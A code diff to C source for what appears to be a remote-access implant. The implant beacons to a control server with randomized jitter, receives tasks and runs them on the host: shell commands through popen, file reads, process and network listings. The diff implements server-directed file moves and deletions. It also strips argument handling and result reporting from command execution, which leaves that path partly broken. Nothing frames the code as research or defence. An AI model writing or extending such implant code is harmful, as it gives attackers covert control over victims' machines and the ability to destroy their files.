@@ -45,21 +45,20 @@ int connect_to_server() {
     return sockfd;
 }
 
-// Fonction pour envoyer une commande au serveur et récupérer la réponse
 int send_command_and_get_response(const char *command, char *response, size_t response_size) {
     int sockfd = connect_to_server();
     if (sockfd < 0) {
         return -1;
     }
     
-    // Envoi de la commande
+    // sending
     if (send(sockfd, command, strlen(command), 0) < 0) {
         perror("Erreur lors de l'envoi de la commande");
         close(sockfd);
         return -1;
     }
     
-    // Réception de la réponse
+    // reception
     int bytes_received = recv(sockfd, response, response_size - 1, 0);
     if (bytes_received < 0) {
         perror("Erreur lors de la réception de la réponse");
@@ -67,7 +66,7 @@ int send_command_and_get_response(const char *command, char *response, size_t re
         return -1;
     }
     
-    // Ajout de la terminaison de chaîne
+    // adding null terminator
     response[bytes_received] = '\0';
     
     close(sockfd);
@@ -87,7 +86,7 @@ void get_uid() {
     strtok(response, ",");         // ignore the first field
     char *id = strtok(NULL, ",");
     
-    // Trim trailing whitespace and newlines
+    // trimming whitespace and newlines to prevent issues
     if (id != NULL) {
         char *end = id + strlen(id) - 1;
         while (end > id && (*end == ' ' || *end == '\n' || *end == '\r')) {
@@ -116,29 +115,18 @@ void task_execve(char *command_str, char *argument_str, const char *id_task) {
     char full_command[4096] = {0};
     strcpy(full_command, command);
     
-    if (argument != NULL) {
-        strcat(full_command, " ");
-        strcat(full_command, argument);
-    }
-    
     printf("Executing command: %s\n", full_command);
     
     // execute the command and capture output
     char result_buffer[4096] = {0};
     FILE *fp = popen(full_command, "r");
     
-    // Read output
+    // reading the output
     char buffer[1024];
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
         strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
     }
     pclose(fp);
-    
-    if (strlen(result_buffer) > 0) {
-        send_result(id_task, result_buffer, 0);
-    } else {
-        printf("No command output to send\n");
-    }
     
     free(command);
     if (argument) free(argument);
@@ -171,8 +159,12 @@ void calculate_random_sleep_time() {
     double time_1 = base_sleep_time - (jitter/100.0 * base_sleep_time);
     double time_2 = base_sleep_time + (jitter/100.0 * base_sleep_time);
     
-    // seeding random number generator
-    srand(time(NULL));
+    // seeding random number generator with urandom
+    FILE *random_file = fopen("/dev/urandom", "r");
+    unsigned int seed;
+    fread(&seed, sizeof(seed), 1, random_file);
+    srand(seed);
+    fclose(random_file);
     
     double random_factor = (double)rand() / RAND_MAX;
     sleep_time = time_1 + random_factor * (time_2 - time_1);
@@ -276,14 +268,34 @@ void task_cat(char *file_path_str, const char *id_task) {
     free(file_path);
 }
 
-void task_mv() {
+void task_mv(char *src_path_str, char *dst_path_str, const char *id_task) {
     printf("Executing task mv\n");
-    return;
+    
+    // decode paths
+    char *src_path = decode(src_path_str);
+    char *dst_path = decode(dst_path_str);
+    
+    printf("Moving %s to %s\n", src_path, dst_path);
+    
+    // rename/move the file
+    int result = rename(src_path, dst_path);
+    
+    free(src_path);
+    free(dst_path);
 }
 
-void task_rm() {
+void task_rm(char *file_path_str, const char *id_task) {
     printf("Executing task rm\n");
-    return;
+    
+    // decode path
+    char *file_path = decode(file_path_str);
+    
+    printf("Removing file: %s\n", file_path);
+    
+    // remove the file
+    int result = unlink(file_path);
+    
+    free(file_path);
 }
 
 void task_ps() {
@@ -361,9 +373,12 @@ void check_commands() {
             char *file_path = strtok(NULL, ",");
             task_cat(file_path, id_task);
         } else if (strcmp(type, "MV") == 0) {
-            task_mv();
+            char *src_path = strtok(NULL, ",");
+            char *dst_path = strtok(NULL, ",");
+            task_mv(src_path, dst_path, id_task);
         } else if (strcmp(type, "RM") == 0) {
-            task_rm();
+            char *file_path = strtok(NULL, ",");
+            task_rm(file_path, id_task);
         } else if (strcmp(type, "PS") == 0) {
             task_ps();
         } else if (strcmp(type, "NETSTAT") == 0) {
